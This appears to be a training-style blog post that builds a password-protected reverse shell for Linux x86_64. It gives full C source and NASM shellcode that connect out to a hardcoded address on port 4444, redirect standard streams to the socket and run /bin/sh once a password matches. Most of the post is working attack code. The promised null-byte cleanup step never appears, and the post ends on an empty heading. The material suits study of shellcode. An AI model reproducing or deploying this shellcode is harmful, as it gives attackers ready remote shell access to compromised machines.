---
title: "Implementing a password protected reverse shell in shellcode"
categories:
  - blog
---

The goal of the following blog post is to write shellcode for the Linux 64-bit architecture that will ultimately connect back to a remote machine and spawn a shell as well as requiring a password before any commands can be run inside the shell.

This blog post will follow a similar process to the bind shell process, but should be a little shorter seeing as a reverse shell is a little easier to implement in C and Assembly and because you should now be a little more familiar with most of the concepts.

We will step through the process again following the same framework:

<ol>
  <li>Firstly, we need to write the code, in the C Programming Language, for creating a socket and then connecting to a remote machine and password protecting it.</li>
  <li>Secondly, the C code needs to be ported to Linux x86_64 Assembly code.</li>
  <li>Lastly, all Null bytes need to be removed from the Assembly code and we need to look for opportunities to optimize our shellcode to keep the final payload as small as possible.</li>
</ol>

```c
#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<netinet/in.h>
#include<string.h>
#include<strings.h>
#include<unistd.h>
#include<arpa/inet.h>


int main()
{
        struct sockaddr_in server;
        int sock;
        int sockaddr_len = sizeof(struct sockaddr_in);
        // Change arguments as needed
        char *arguments[] = { "/bin/sh", 0, "4444", "127.0.0.1", "YOLOOOOOOO" };
        char buf[16];

        sock = socket(AF_INET, SOCK_STREAM, 0);
      
        server.sin_family = AF_INET;
        server.sin_port = htons(atoi(arguments[2]));
        server.sin_addr.s_addr = inet_addr(arguments[3]);
        bzero(&server.sin_zero, 8);

        connect(sock, (struct sockaddr *)&server, sockaddr_len);

        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);

        read(sock, buf, 16);
        buf[strcspn(buf, "\n")] = 0;
        if (strcmp(arguments[4], buf) == 0)
        {        
              execve(arguments[0], &arguments[0], NULL);
        }
       
}
```

```nasm
global _start

section .text

_start:

        ; create socket
        mov rax, 41
        mov rdi, 2
        mov rsi, 1
        mov rdx, 0
        syscall

        mov rdi, rax

        xor rax, rax

        push rax
        ; change IP as reverse hex as needed
        mov dword [rsp-4], 0x7b01a8c0
        mov word [rsp-6], 0x5c11
        mov word [rsp-8], 0x2
        sub rsp, 8


        ;connect(sock, (struct sockaddr *)&server, sockaddr_len)
        
        mov rax, 42
        mov rsi, rsp
        mov rdx, 16
        syscall

        mov rax, 33
        mov rsi, 0
        syscall

        mov rax, 33
        mov rsi, 1
        syscall

        mov rax, 33
        mov rsi, 2
        syscall

        xor rax, rax

        push r10
        mov rsi, rsp
        
        xor rdx, rdx
        mov rdx, 8
        syscall

        xor rax, rax
        ; password '8bytesss'
        mov rax, 0x7373736574796238
        mov rdi, rsi
        scasq
        jne exit

        xor rax, rax
        push rax

        mov rbx, 0x68732f2f6e69622f
        push rbx

        mov rdi, rsp

        push rax

        mov rdx, rsp

        push rdi
        mov rsi, rsp
        mov rax, 59
        syscall

exit:
        xor rax, rax
        mov rax, 60
        syscall
```
<h2></h2>
